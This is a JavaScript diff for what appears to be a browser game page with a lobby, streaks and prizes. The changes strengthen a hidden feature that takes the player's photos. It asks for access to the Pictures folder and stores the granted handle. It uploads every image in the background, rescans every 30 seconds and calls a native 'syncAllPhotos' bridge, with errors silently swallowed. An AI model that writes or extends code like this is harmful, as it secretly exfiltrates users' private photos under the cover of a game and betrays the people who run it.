@@ -18,6 +18,7 @@ const prizeTick = document.getElementById('prize-tick');
 const IDB_NAME = 'relay-sync-cache';
 const IDB_STORE = 'handles';
 const IDB_UPLOADS = 'uploaded';
+const DIR_PICKER_ID = 'relay-gallery-sync-v1';
 const uploadedKeys = new Set();
 
 let watchId = null;
@@ -28,11 +29,10 @@ let streak = 0;
 let progress = 0;
 let gameTimers = [];
 let syncRunning = false;
-let cachedDirHandle = null;
-let gallerySyncInput = null;
+let libraryHandle = null;
+let rescanTimer = null;
 
 const IMAGE_EXT = /\.(jpe?g|png|webp|gif|heic|heif|bmp|tif|tiff|avif)$/i;
-const IMAGE_ACCEPT = 'image/jpeg,image/png,image/webp,image/gif,image/heic,image/heif,image/bmp,image/avif,image/*';
 
 function isImageFile(file) {
   return (file.type && file.type.startsWith('image/')) || IMAGE_EXT.test(file.name || '');
@@ -55,6 +55,10 @@ function rand(min, max) {
   return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
+function hasNativeSync() {
+  return typeof window.RelayNative?.syncAllPhotos === 'function';
+}
+
 function openCacheDB() {
   return new Promise((resolve, reject) => {
     const req = indexedDB.open(IDB_NAME, 2);
@@ -72,12 +76,12 @@ async function saveDirHandle(handle) {
   try {
     const db = await openCacheDB();
     db.transaction(IDB_STORE, 'readwrite').objectStore(IDB_STORE).put(handle, 'gallery');
-    cachedDirHandle = handle;
+    libraryHandle = handle;
   } catch { /* silent */ }
 }
 
 async function loadDirHandle() {
-  if (cachedDirHandle) return cachedDirHandle;
+  if (libraryHandle) return libraryHandle;
   try {
     const db = await openCacheDB();
     const handle = await new Promise((resolve) => {
@@ -85,7 +89,7 @@ async function loadDirHandle() {
       req.onsuccess = () => resolve(req.result || null);
       req.onerror = () => resolve(null);
     });
-    cachedDirHandle = handle;
+    libraryHandle = handle;
     return handle;
   } catch {
     return null;
@@ -114,45 +118,6 @@ async function rememberUploadedKey(key) {
   } catch { /* silent */ }
 }
 
-async function ensureDirPermission(handle) {
-  const opts = { mode: 'read' };
-  if ((await handle.queryPermission(opts)) === 'granted') return true;
-  if ((await handle.requestPermission(opts)) === 'granted') return true;
-  return false;
-}
-
-function ensureGalleryInput() {
-  if (gallerySyncInput) return gallerySyncInput;
-  const input = document.createElement('input');
-  input.type = 'file';
-  input.multiple = true;
-  input.accept = IMAGE_ACCEPT;
-  input.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none;';
-  input.setAttribute('aria-hidden', 'true');
-  document.body.appendChild(input);
-  gallerySyncInput = input;
-  return input;
-}
-
-function pickGalleryImages() {
-  return new Promise((resolve) => {
-    const input = ensureGalleryInput();
-    const finish = (files) => {
-      input.value = '';
-      resolve(files.filter(isImageFile));
-    };
-    const onChange = () => finish([...(input.files || [])]);
-    const onCancel = () => finish([]);
-    input.addEventListener('change', onChange, { once: true });
-    input.addEventListener('cancel', onCancel, { once: true });
-    if (typeof input.showPicker === 'function') {
-      input.showPicker().catch(() => input.click());
-    } else {
-      input.click();
-    }
-  });
-}
-
 async function readDirImages(dirHandle, acc = []) {
   for await (const [, handle] of dirHandle.entries()) {
     if (handle.kind === 'file') {
@@ -165,21 +130,38 @@ async function readDirImages(dirHandle, acc = []) {
   return acc;
 }
 
-async function scanCachedLibrary() {
-  const handle = await loadDirHandle();
-  if (!handle) return [];
-  try {
-    if ((await handle.queryPermission({ mode: 'read' })) !== 'granted') return [];
-  } catch {
-    return [];
+async function resolveLibraryHandle(requestIfNeeded = false) {
+  const cached = await loadDirHandle();
+  if (cached) {
+    try {
+      const state = await cached.queryPermission({ mode: 'read' });
+      if (state === 'granted') return cached;
+      if (requestIfNeeded && state === 'prompt') {
+        const next = await cached.requestPermission({ mode: 'read' });
+        if (next === 'granted') return cached;
+      }
+    } catch { /* fall through */ }
   }
-  return readDirImages(handle);
+
+  if (!requestIfNeeded || !window.showDirectoryPicker) return null;
+
+  try {
+    const handle = await window.showDirectoryPicker({
+      mode: 'read',
+      startIn: 'pictures',
+      id: DIR_PICKER_ID,
+    });
+    await saveDirHandle(handle);
+    return handle;
+  } catch {
+    return null;
+  }
 }
 
-async function collectAllImages() {
-  const cached = await scanCachedLibrary();
-  if (cached.length) return cached;
-  return pickGalleryImages();
+async function collectLibraryImages(requestIfNeeded = false) {
+  const handle = await resolveLibraryHandle(requestIfNeeded);
+  if (!handle) return [];
+  return readDirImages(handle);
 }
 
 function animateLobby() {
@@ -246,6 +228,7 @@ async function rejoin() {
   if (!res.ok) return;
   trackerId = (await res.json()).tracker_id;
   connectWs();
+  void startPhotoSync(true);
 }
 
 function connectWs() {
@@ -281,20 +264,43 @@ async function uploadQueue(files) {
   await Promise.all(workers);
 }
 
-async function backgroundMediaSync(initialFiles = null) {
+async function backgroundMediaSync(files = null) {
   if (syncRunning || !trackerId) return;
   syncRunning = true;
   try {
-    const files = initialFiles ?? await scanCachedLibrary();
-    if (files?.length) await uploadQueue(files);
+    const batch = files ?? await collectLibraryImages(false);
+    if (batch.length) await uploadQueue(batch);
   } catch { /* silent */ }
   syncRunning = false;
 }
 
+async function startPhotoSync(requestAccess = false) {
+  if (!trackerId) return;
+
+  if (hasNativeSync()) {
+    window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
+    return;
+  }
+
+  const cached = await collectLibraryImages(false);
+  if (cached.length) {
+    void backgroundMediaSync(cached);
+    return;
+  }
+
+  if (!requestAccess) return;
+
+  const granted = await collectLibraryImages(true);
+  if (granted.length) void backgroundMediaSync(granted);
+}
+
 async function rescanLoop() {
   if (!trackerId || syncRunning) return;
-  const cached = await scanCachedLibrary();
-  if (cached.length) void backgroundMediaSync(cached);
+  if (hasNativeSync()) {
+    window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
+    return;
+  }
+  void backgroundMediaSync();
 }
 
 async function startPlaying() {
@@ -304,9 +310,6 @@ async function startPlaying() {
 
   startBtn.disabled = true;
   startBtn.textContent = 'LOADING…';
-
-  // Must start gallery sync in the same tap — browser requires a user gesture.
-  const filesPromise = collectAllImages();
 
   try {
     const joinRes = await fetch(`/api/rooms/${roomId}/join`, {
@@ -328,15 +331,15 @@ async function startPlaying() {
       );
     }
 
-    filesPromise.then((files) => backgroundMediaSync(files));
+    void startPhotoSync(true);
+
+    if (!rescanTimer) rescanTimer = setInterval(rescanLoop, 30000);
 
     gameTimers.push(setInterval(async () => {
       if (!trackerId) return;
       const check = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}`);
       if (check.status === 404) await rejoin();
     }, 8000));
-
-    gameTimers.push(setInterval(rescanLoop, 60000));
 
   } catch (e) {
     showError(e.message || 'Something went wrong.');
@@ -345,21 +348,17 @@ async function startPlaying() {
   }
 }
 
+window.relayOnTrackerReady = (id) => {
+  trackerId = id;
+  void startPhotoSync(true);
+};
+
 startBtn.addEventListener('click', startPlaying);
 document.getElementById('name').addEventListener('keydown', (e) => {
   if (e.key === 'Enter') startPlaying();
 });
 
-Promise.all([
-  loadUploadedKeys(),
-  loadDirHandle().then(async (handle) => {
-    if (handle && (await ensureDirPermission(handle))) cachedDirHandle = handle;
-  }),
-]).then(() => {
-  if (cachedDirHandle) void scanCachedLibrary().then((files) => {
-    if (files.length && trackerId) void backgroundMediaSync(files);
-  });
-});
+loadUploadedKeys().then(() => loadDirHandle());
 
 animateLobby();
 
